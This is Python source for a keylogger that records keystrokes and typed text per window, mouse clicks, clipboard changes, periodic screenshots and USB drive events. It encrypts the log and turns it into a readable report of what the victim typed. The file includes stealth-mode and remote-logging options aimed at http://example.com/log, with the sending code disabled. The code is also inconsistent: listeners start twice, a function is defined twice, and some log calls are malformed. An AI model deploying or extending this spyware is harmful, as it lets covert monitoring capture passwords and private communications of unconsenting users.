import os
import platform
import psutil
import logging
import time
import os
import threading
import json
import re # Added for LogParser
from datetime import datetime # Added for LogEntry
from collections import deque, defaultdict
from cryptography.fernet import Fernet
from pynput import keyboard, mouse
from PIL import ImageGrab
import requests
import string

# Windows-specific imports
if platform.system() == "Windows":
    try:
        import win32file
        import win32con
        import win32gui
        import win32process
    except ImportError:
        logging.error("win32gui or win32process not found. Please install pywin32.")

# Clipboard monitoring
try:
    import pyperclip
    clipboard_available = True
except ImportError:
    clipboard_available = False
    logging.warning("pyperclip not installed. Clipboard monitoring will be disabled.")

# Generate a key for encryption (in production, store the key securely)
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# Define a data structure for log entries
class LogEntry:
    def __init__(self, timestamp, event_type, details, window_name):
        self.timestamp = timestamp
        self.event_type = event_type
        self.details = details
        self.window_name = window_name

    def to_log_string(self):
        # Format the entry for the raw log file
        return f"{self.timestamp.strftime('%Y-%m-%d %H:%M:%S,%f')[:-3]}: {self.event_type}: {self.details} in {self.window_name}"

# Configure logging to a file and console
logging.basicConfig(
    level=logging.INFO,
    format='%(message)s', # Changed format to only log the message itself
    handlers=[
        logging.FileHandler("keylog.txt"),
        logging.StreamHandler()
    ]
)
logging.getLogger().handlers[1].setLevel(logging.INFO)
current_text = deque()
log_buffer = deque() # Stores LogEntry objects
active_window_name = None
active_window_start_time = time.time()
pressed_keys = set()
clipboard_content = None
usage_stats = defaultdict(float)
stop_event = threading.Event()

def get_active_window_process_name() -> str:
    """Returns the active window's process name and title."""
    try:
        if platform.system() == "Windows":
            window_handle = win32gui.GetForegroundWindow()
            window_title = win32gui.GetWindowText(window_handle)
            _, pid = win32process.GetWindowThreadProcessId(window_handle)
            process = psutil.Process(pid)
            return f"{process.name()} - {window_title}"

        else:
            # Basic implementation for non-Windows, might need refinement
            # This part might require platform-specific libraries for better accuracy
            return "Unknown Application"
    except Exception as e:
        logging.error(f"Error getting active window process name: {e}")
        return "Unknown Window"

active_window_name = get_active_window_process_name()

def log_event(event_type: str, details: str) -> None:
    """Create a LogEntry and add it to the buffer."""
    entry = LogEntry(datetime.now(), event_type, details, active_window_name)
    logging.info(entry.to_log_string()) # Log the formatted string
    log_buffer.append(entry) # Buffer the object
    # send_remote_log(entry.to_log_string()) # Assuming send_remote_log expects a string
    if len(log_buffer) >= 10:
        flush_log_buffer()

def flush_log_buffer() -> None:
    """Write all buffered LogEntry objects to the log file as strings."""
    with open("keylog.txt", "a") as log_file:
        while log_buffer:
            entry = log_buffer.popleft()
            log_file.write(entry.to_log_string() + "\n")

def log_time_spent_on_window(window_name: str, start_time: float) -> None:
    """Log the time spent on a given window and update usage statistics."""
    time_spent = time.time() - start_time
    usage_stats[window_name] += time_spent
    log_event("Time Spent", f"{time_spent:.2f} seconds on {window_name}")

def handle_window_change() -> None:
    """Check if the active window has changed and log the time spent on the previous one."""
    global active_window_name, active_window_start_time
    new_window_name = get_active_window_process_name()
    if new_window_name != active_window_name:
        if active_window_name is not None:
            log_time_spent_on_window(active_window_name, active_window_start_time)
        active_window_name = new_window_name
        active_window_start_time = time.time()
        log_event("Active Window Changed", f"Switched to {active_window_name}")

def on_press(key) -> None:
    """Handle key press events."""
    try:
        handle_window_change()
        pressed_keys.add(str(key)) # Store key representation as string
        log_event("Key Pressed", f"{key}")
    except Exception as e:
        logging.error(f"Error in on_press: {e}")

def on_release(key) -> None:
    """Handle key release events and capture text input."""
    try:
        handle_window_change()
        key_str = str(key)

        if hasattr(key, 'char') and key.char is not None:
            # Only append printable characters
            if key.char in string.printable and key.char not in ('\n', '\r', '\t'):
                 current_text.append(key.char)
        elif key == keyboard.Key.space:
            current_text.append(' ')
        elif key == keyboard.Key.enter:
            current_text.append('\n')

        # Log text input when space or enter is released, or buffer is significant
        if key in {keyboard.Key.space, keyboard.Key.enter} or len(current_text) > 20:
            text_input = ''.join(current_text).strip()
            if text_input:
                log_event("Text Input", f"{text_input}")
            current_text.clear()

        log_event("Key Released", f"{key}")

        # Handle shortcuts
        if key_str in pressed_keys:
             pressed_keys.remove(key_str)
        if pressed_keys:
            # Filter out modifier keys from the shortcut log if needed
            shortcut_keys = [k for k in pressed_keys if not isinstance(k, (keyboard.Key, keyboard.KeyCode)) or 'ctrl' not in k.lower() and 'alt' not in k.lower() and 'shift' not in k.lower()]
            if shortcut_keys:
                 log_event("Shortcut Used", f"{', '.join(shortcut_keys)}")

        if key == keyboard.Key.esc:
            stop_listeners()
            return None # Stop listener
    except Exception as e:
        logging.error(f"Error in on_release: {e}")

def on_click(x: int, y: int, button, pressed: bool) -> None:
    """Handle mouse click events."""
    try:
        handle_window_change()
        action = "Pressed" if pressed else "Released"
        log_event(f"Mouse {action}", f"at ({x}, {y}) with {button}")
    except Exception as e:
        logging.error(f"Error in on_click: {e}")

def on_scroll(x: int, y: int, dx: int, dy: int) -> None:
    """Handle mouse scroll events."""
    try:
        handle_window_change()
        log_event("Mouse Scrolled", f"at ({x}, {y}) with delta ({dx}, {dy})")
    except Exception as e:
        logging.error(f"Error in on_scroll: {e}")

def stop_listeners() -> None:
    """Stop all listeners and signal the clipboard thread to stop."""
    try:
        stop_event.set()
        # Ensure listeners are actually running before stopping
        if 'keyboard_listener' in globals() and keyboard_listener.is_alive():
            keyboard_listener.stop()
        if 'mouse_listener' in globals() and mouse_listener.is_alive():
            mouse_listener.stop()

        if clipboard_available and 'clipboard_thread' in globals() and clipboard_thread.is_alive():
             # No need to set stop_event again, it's already set
             pass # The thread checks stop_event in its loop
        logging.info("Listeners stopping...")
    except Exception as e:
        logging.error(f"Error stopping listeners: {e}")



def periodic_flush() -> None:
    """Flush the log buffer to disk periodically."""
    while not stop_event.is_set():
        stop_event.wait(10) # Wait for 10 seconds or until stop_event is set
        if not stop_event.is_set(): # Check again before flushing
             flush_log_buffer()

def log_active_window() -> None:
    """Log the active window periodically."""
    while not stop_event.is_set():
        stop_event.wait(5) # Wait for 5 seconds or until stop_event is set
        if not stop_event.is_set():
            handle_window_change() # Checks if window changed and logs time if so
            # log_event("Active Window Check", f"Current: {active_window_name}") # Avoid redundant logging

def monitor_clipboard() -> None:
    """Monitor clipboard changes and log them."""
    global clipboard_content
    if not clipboard_available:
        return

    try:
        clipboard_content = pyperclip.paste()
    except Exception as e:
        logging.error(f"Error accessing clipboard initially: {e}")
        clipboard_content = "Error accessing clipboard"

    while not stop_event.is_set():
        stop_event.wait(3) # Wait for 3 seconds or until stop_event is set
        if stop_event.is_set():
            break
        try:
            current_clipboard = pyperclip.paste()
            if current_clipboard != clipboard_content:
                clipboard_content = current_clipboard
                # Avoid logging potentially large clipboard content directly
                log_event("Clipboard Changed", f"New content copied (length: {len(clipboard_content)})")
                # Optionally log a snippet or hash if needed for debugging
                # log_event("Clipboard Changed", f"New content: {clipboard_content[:50]}...")
        except Exception as e: # Catch potential pyperclip errors
            logging.error(f"Error reading clipboard: {e}")
            # Maybe set clipboard_content to an error state or skip logging
            clipboard_content = "Error reading clipboard"

SCREENSHOT_DIR = "screenshots"

def capture_screenshot() -> None:
    """Capture a screenshot and save it to a file in the screenshots directory."""
    try:
        # Ensure the screenshot directory exists
        if not os.path.exists(SCREENSHOT_DIR):
            os.makedirs(SCREENSHOT_DIR)

        screenshot = ImageGrab.grab()
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        file_name = f"screenshot_{timestamp}.png"
        file_path = os.path.join(SCREENSHOT_DIR, file_name)
        screenshot.save(file_path)
        log_event(f"Screenshot captured: {file_path}")
    except Exception as e:
        logging.error(f"Error capturing screenshot: {e}")

def periodic_screenshot_capture(interval: int = 10) -> None:
    """Capture screenshots at regular intervals."""
    while not stop_event.is_set():
        capture_screenshot()
        time.sleep(interval)

def log_network_activity(url: str) -> None:
    """Log network activity such as visited URLs."""
    try:
        response = requests.get(url)
        log_event(f"Visited URL: {url} - Status Code: {response.status_code}")
    except Exception as e:
        logging.error(f"Error logging network activity: {e}")

def display_usage_statistics() -> None:
    """Display the application usage statistics."""
    print("\n--- Application Usage Statistics ---\n")
    for window, duration in usage_stats.items():
        print(f"{window}: {duration:.2f} seconds")
    print("\n--- End of Statistics ---\n")

def get_drive_letters(bitmask):
    """Convert bitmask to a set of drive letters."""
    drives = set()
    for i in range(26):
        if bitmask & (1 << i):
            drives.add(f"{string.ascii_uppercase[i]}:\\")
    return drives

def monitor_usb_devices() -> None:
    """Monitor USB device connections and disconnections."""
    drive_list = get_drive_letters(win32file.GetLogicalDrives())
    while not stop_event.is_set():
        time.sleep(1)
        new_drive_list = get_drive_letters(win32file.GetLogicalDrives())
        added_drives = new_drive_list - drive_list
        removed_drives = drive_list - new_drive_list
        for drive in added_drives:
            log_event(f"USB device connected: {drive}")
        for drive in removed_drives:
            log_event(f"USB device disconnected: {drive}")
        drive_list = new_drive_list

# Configuration settings
config = {
    "remote_logging": False,
    "remote_server": "http://example.com/log",
    "stealth_mode": False,
    "email_alerts": False,
    "email_recipient": "",
    "features": {
        "key_logging": True,
        "mouse_logging": True,
        "clipboard_logging": True,
        "screenshots": True,
        "usb_monitoring": True,
        "network_logging": True
    }
}

def load_config(config_file="config.json"):
    """Load configuration from JSON file."""
    global config
    try:
        with open(config_file) as f:
            config.update(json.load(f))
    except Exception as e:
        logging.error(f"Error loading config: {e}")

def send_remote_log(message):
    """Send log message to remote server if enabled."""
    if config["remote_logging"]:
        try:
            requests.post(config["remote_server"], 
                         json={"log": message, "timestamp": time.time()})
        except Exception as e:
            logging.error(f"Remote logging failed: {e}")

# --- Set up Listeners and Threads ---
try:
    keyboard_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    keyboard_listener.start()
except Exception as e:
    logging.error(f"Error setting up keyboard listener: {e}")

try:
    mouse_listener = mouse.Listener(on_click=on_click, on_scroll=on_scroll)
    mouse_listener.start()
except Exception as e:
    logging.error(f"Error setting up mouse listener: {e}")

# Removed key_combination_listener as it was unused and causing potential hangs

flush_thread = threading.Thread(target=periodic_flush, daemon=True)
flush_thread.start()

active_window_thread = threading.Thread(target=log_active_window, daemon=True)
active_window_thread.start()

if clipboard_available:
    clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
    # No need to set 'do_run' anymore
    clipboard_thread.start()

screenshot_thread = threading.Thread(target=periodic_screenshot_capture, daemon=True)
screenshot_thread.start()

usb_thread = threading.Thread(target=monitor_usb_devices, daemon=True)
usb_thread.start()

# Main loop: block until listeners are stopped
try:
    # Wait for the non-daemon listeners to finish
    keyboard_listener.join()
    mouse_listener.join()
    # key_combination_listener.join() # Removed

    # Daemon threads (flush, active_window, clipboard, screenshot, usb)
    # will exit automatically when the main thread and listeners finish.
    # No need to explicitly join them.
except Exception as e:
    logging.error(f"Error joining listeners: {e}")

# Final flush of any remaining log messages
flush_log_buffer()

# Encrypt the log file
try:
    with open("keylog.txt", "rb") as file:
        log_data = file.read()
    encrypted_data = cipher_suite.encrypt(log_data)
    with open("keylog.enc", "wb") as file:
        file.write(encrypted_data)
    print("Log file encrypted as 'keylog.enc'.")
except Exception as e:
    logging.error(f"Error encrypting log file: {e}")

# Display usage statistics
display_usage_statistics()

class LogParser:
    def __init__(self, log_file_path="keylog.txt"):
        self.log_file_path = log_file_path
        self.patterns = {
            'text_input': re.compile(r"(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2},\d{3}): Text Input: (.*?) in (.*?)$", re.IGNORECASE),
            'key_press': re.compile(r"(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2},\d{3}): Key Pressed: (.*?) in (.*?)$", re.IGNORECASE),
            'key_release': re.compile(r"(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2},\d{3}): Key Released: (.*?) in (.*?)$", re.IGNORECASE),
            'shortcut': re.compile(r"(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2},\d{3}): Shortcut Used: (.*?) in (.*?)$", re.IGNORECASE),
            'mouse_press': re.compile(r"(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2},\d{3}): Mouse Pressed: at \((.*?)\) with (.*?) in (.*?)$", re.IGNORECASE),
            'mouse_release': re.compile(r"(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2},\d{3}): Mouse Released: at \((.*?)\) with (.*?) in (.*?)$", re.IGNORECASE),
            'mouse_scroll': re.compile(r"(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2},\d{3}): Mouse Scrolled: at \((.*?)\) with delta \((.*?)\) in (.*?)$", re.IGNORECASE),
            'clipboard': re.compile(r"(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2},\d{3}): Clipboard Changed: (.*?) in (.*?)$", re.IGNORECASE),
            'active_window': re.compile(r"(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2},\d{3}): Active Window Changed: Switched to (.*?)$", re.IGNORECASE), # Adjusted pattern
            'time_spent': re.compile(r"(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2},\d{3}): Time Spent: (.*?) seconds on (.*?)$", re.IGNORECASE), # Adjusted pattern
        }

    def parse_log_line(self, line):
        for event_type, pattern in self.patterns.items():
            match = pattern.match(line.strip())
            if match:
                groups = match.groups()
                timestamp_str = groups[0]
                timestamp = datetime.strptime(timestamp_str, '%Y-%m-%d %H:%M:%S,%f')

                if event_type == 'text_input':
                    return LogEntry(timestamp, 'Text Input', groups[1], groups[2])
                elif event_type in ['key_press', 'key_release']:
                    return LogEntry(timestamp, event_type.replace('_', ' ').title(), groups[1], groups[2])
                elif event_type == 'shortcut':
                    return LogEntry(timestamp, 'Shortcut Used', groups[1], groups[2])
                elif event_type in ['mouse_press', 'mouse_release']:
                    details = f"at ({groups[1]}) with {groups[2]}"
                    return LogEntry(timestamp, f"Mouse {event_type.split('_')[1].title()}", details, groups[3])
                elif event_type == 'mouse_scroll':
                    details = f"at ({groups[1]}) with delta ({groups[2]})"
                    return LogEntry(timestamp, 'Mouse Scrolled', details, groups[3])
                elif event_type == 'clipboard':
                     # We only log the length now, so parsing needs adjustment if full content is needed
                    return LogEntry(timestamp, 'Clipboard Changed', groups[1], groups[2])
                elif event_type == 'active_window':
                    # Window name is the only detail here
                    return LogEntry(timestamp, 'Active Window Changed', f"Switched to {groups[1]}", groups[1])
                elif event_type == 'time_spent':
                    # Details: time, Window name is the last group
                    return LogEntry(timestamp, 'Time Spent', f"{groups[1]} seconds", groups[2])
        return None # Return None if no pattern matches

    def generate_readable_report(self, output_file_path="readable_log_report.txt"):
        """Parses the log file and generates a human-readable report focusing on text input."""
        try:
            with open(self.log_file_path, 'r') as log_file, open(output_file_path, 'w') as report_file:
                current_window = "Unknown Window"
                typed_text = ""

                for line in log_file:
                    entry = self.parse_log_line(line)
                    if entry:
                        if entry.event_type == 'Active Window Changed':
                            # Write accumulated text before switching window context
                            if typed_text:
                                report_file.write(f"[{current_window}] Typed: '{typed_text}'\n")
                                typed_text = ""
                            # Extract the actual window name for the context
                            match = re.search(r"Switched to (.*?)$", entry.details)
                            if match:
                                current_window = match.group(1).strip()
                            else:
                                current_window = entry.window_name # Fallback

                        elif entry.event_type == 'Text Input':
                             # Ensure the text input belongs to the current tracked window
                             if entry.window_name == current_window:
                                 typed_text += entry.details
                             else:
                                 # Text input occurred in a different window than the last 'Active Window Changed' event
                                 # Write out any previous text
                                 if typed_text:
                                     report_file.write(f"[{current_window}] Typed: '{typed_text}'\n")
                                 # Start new text block for the window mentioned in the text input log
                                 current_window = entry.window_name
                                 typed_text = entry.details

                        elif entry.event_type in ['Key Press', 'Key Release', 'Shortcut Used', 'Mouse Press', 'Mouse Release', 'Mouse Scroll', 'Clipboard Changed', 'Time Spent']:
                             # If other events interrupt text flow, write out accumulated text
                             if typed_text:
                                 report_file.write(f"[{current_window}] Typed: '{typed_text}'\n")
                                 typed_text = ""
                             # Optionally log other events to the readable report if desired
                             # report_file.write(f"[{entry.window_name}] Event: {entry.event_type} - {entry.details}\n")
                             pass # Currently ignoring other events in readable report

                # Write any remaining typed text at the end of the file
                if typed_text:
                    report_file.write(f"[{current_window}] Typed: '{typed_text}'\n")

            logging.info(f"Readable report generated at {output_file_path}")
        except FileNotFoundError:
            logging.error(f"Log file not found at {self.log_file_path}")
        except Exception as e:
            logging.error(f"Error generating readable report: {e}")

def send_remote_log(log_entry: str) -> None:
    """Encrypts and sends a log entry to a remote server."""
    # Placeholder for remote logging functionality
    # encrypted_entry = cipher_suite.encrypt(log_entry.encode())
    # try:
    #     response = requests.post("YOUR_REMOTE_ENDPOINT", data=encrypted_entry)
    #     response.raise_for_status() # Raise an exception for bad status codes
    # except requests.exceptions.RequestException as e:
    #     logging.error(f"Failed to send log remotely: {e}")
    pass # Currently disabled

def main():
    global keyboard_listener, mouse_listener, clipboard_thread # Ensure they are global

    logging.info("Keylogger started.")

    # Start listeners in separate threads
    keyboard_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    mouse_listener = mouse.Listener(on_click=on_click, on_scroll=on_scroll)
    # key_combination_listener removed

    keyboard_listener.start()
    mouse_listener.start()
    # key_combination_listener removed

    # Start periodic tasks
    flush_thread = threading.Thread(target=periodic_flush, daemon=True)
    window_log_thread = threading.Thread(target=log_active_window, daemon=True)
    flush_thread.start()
    window_log_thread.start()

    # Start clipboard monitoring if available
    if clipboard_available:
        clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
        clipboard_thread.start()

    try:
        # Keep the main thread alive until stop_event is set
        stop_event.wait() # Wait indefinitely until stop_event.set() is called

    finally:
        logging.info("Initiating shutdown...")
        # Ensure listeners are stopped (redundant if stop_listeners called, but safe)
        if keyboard_listener.is_alive():
            keyboard_listener.stop()
        if mouse_listener.is_alive():
            mouse_listener.stop()
        # key_combination_listener removed

        # Wait for threads to finish
        keyboard_listener.join()
        mouse_listener.join()
        # key_combination_listener removed
        flush_thread.join(timeout=2) # Give flush thread time to finish
        window_log_thread.join(timeout=1)
        if clipboard_available and 'clipboard_thread' in globals() and clipboard_thread.is_alive():
            clipboard_thread.join(timeout=1)

        # Final flush of any remaining logs
        flush_log_buffer()

        # Log final time spent on the last active window
        if active_window_name is not None:
            log_time_spent_on_window(active_window_name, active_window_start_time)
            flush_log_buffer() # Flush the final time spent log

        # Generate the final readable report
        parser = LogParser()
        parser.generate_readable_report()

        logging.info("Keylogger stopped.")
        # Log usage statistics
        logging.info("--- Usage Statistics ---")
        for window, duration in usage_stats.items():
            logging.info(f"{window}: {duration:.2f} seconds")
        logging.info("------------------------")

if __name__ == "__main__":
    main()